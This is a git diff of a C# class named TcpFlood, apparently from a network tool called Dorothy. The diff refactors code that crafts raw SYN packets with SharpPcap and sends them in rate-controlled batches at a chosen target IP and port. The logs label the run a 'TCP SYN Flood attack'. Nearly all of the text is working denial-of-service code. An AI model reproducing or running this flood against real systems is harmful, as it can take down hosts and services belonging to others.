@@ -10,32 +10,20 @@ using SharpPcap.LibPcap;
 using System.Buffers;
 using System.Runtime.InteropServices;
 using System.Net.Sockets;
+using Dorothy.Models;
 
 namespace Dorothy.Models
 {
     public class TcpFlood : IDisposable
     {
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
-        private readonly string _sourceIp;
-        private readonly PhysicalAddress _sourceMac;
-        private readonly string _targetIp;
-        private readonly byte[] _targetMac;
-        private readonly byte[] _gatewayMac;
-        private readonly int _targetPort;
-        private readonly long _bytesPerSecond;
+        private readonly PacketParameters _params;
         private readonly CancellationToken _cancellationToken;
         private LibPcapLiveDevice? _device;
-        private static readonly ArrayPool<byte> PacketPool = ArrayPool<byte>.Shared;
 
-        public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] gatewayMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
+        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
         {
-            _sourceIp = sourceIp;
-            _sourceMac = new PhysicalAddress(sourceMac);
-            _targetIp = targetIp;
-            _targetMac = targetMac;
-            _gatewayMac = gatewayMac;
-            _targetPort = targetPort;
-            _bytesPerSecond = bytesPerSecond;
+            _params = parameters;
             _cancellationToken = cancellationToken;
         }
 
@@ -47,7 +35,9 @@ namespace Dorothy.Models
             {
                 _device = CaptureDeviceList.Instance
                     .OfType<LibPcapLiveDevice>()
-                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));
+                    .FirstOrDefault(d => d.Addresses.Any(addr => 
+                        addr.Addr.ipAddress != null && 
+                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));
 
                 if (_device == null)
                 {
@@ -64,23 +54,21 @@ namespace Dorothy.Models
                 }
 
                 var ethernetPacket = new EthernetPacket(
-                    _sourceMac,
-                    new PhysicalAddress(_targetMac),
+                    PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", "")),
+                    PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", "")),
                     EthernetType.IPv4);
 
-                var ipPacket = new IPv4Packet(
-                    IPAddress.Parse(_sourceIp),
-                    IPAddress.Parse(_targetIp))
+                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                 {
                     Protocol = PacketDotNet.ProtocolType.Tcp,
-                    TimeToLive = 128
+                    TimeToLive = _params.Ttl
                 };
 
                 var tcpPacket = new TcpPacket(
-                    6819,
-                    (ushort)_targetPort)
+                    (ushort)_params.SourcePort,
+                    (ushort)_params.DestinationPort)
                 {
-                    Flags = 0x02,
+                    Flags = 0x02,  // SYN flag
                     WindowSize = 8192,
                     SequenceNumber = 0,
                     PayloadData = new byte[1400]
@@ -91,57 +79,42 @@ namespace Dorothy.Models
                 ethernetPacket.PayloadPacket = ipPacket;
 
                 double packetSize = ethernetPacket.Bytes.Length;
-                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
+                int packetsPerSecond = (int)Math.Ceiling(_params.BytesPerSecond / packetSize);
                 int batchSize = 100;
                 double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
 
-                Logger.Info($"TCP SYN Flood: Target rate {_bytesPerSecond / 125_000} Mbps ({packetsPerSecond} packets/sec, {batchSize} batch size)");
+                Logger.Info($"TCP SYN Flood: Target rate {_params.BytesPerSecond / 125_000} Mbps ({packetsPerSecond} packets/sec, {batchSize} batch size)");
 
-                await Task.Run(() =>
+                await Task.Run(async () =>
                 {
-                    var stopwatch = new System.Diagnostics.Stopwatch();
                     while (!_cancellationToken.IsCancellationRequested)
                     {
-                        try
+                        for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                         {
-                            stopwatch.Restart();
-                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
-                            {
-                                (_device as IInjectionDevice).SendPacket(ethernetPacket);
-                            }
-
-                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
-                            if (elapsedMicroseconds < delayMicroseconds)
-                            {
-                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
-                                if (remainingMicroseconds > 1000)
-                                {
-                                    Thread.Sleep(remainingMicroseconds / 1000);
-                                }
-                            }
+                            injectionDevice.SendPacket(ethernetPacket);
                         }
-                        catch (Exception ex)
-                        {
-                            Logger.Error(ex, "Failed to send TCP packet.");
-                        }
+                        await Task.Delay(TimeSpan.FromMicroseconds(delayMicroseconds));
                     }
-                    return Task.CompletedTask;
-                }, _cancellationToken);
+                });
             }
             catch (TaskCanceledException)
             {
                 Logger.Info("TCP SYN Flood attack was canceled.");
             }
+            catch (Exception ex)
+            {
+                Logger.Error(ex, "TCP SYN Flood attack failed.");
+                throw;
+            }
             finally
             {
                 _device?.Close();
-                Logger.Info("TCP SYN Flood attack stopped.");
             }
         }
 
         public void Dispose()
         {
-            _device?.Dispose();
+            _device?.Close();
         }
     }
 }
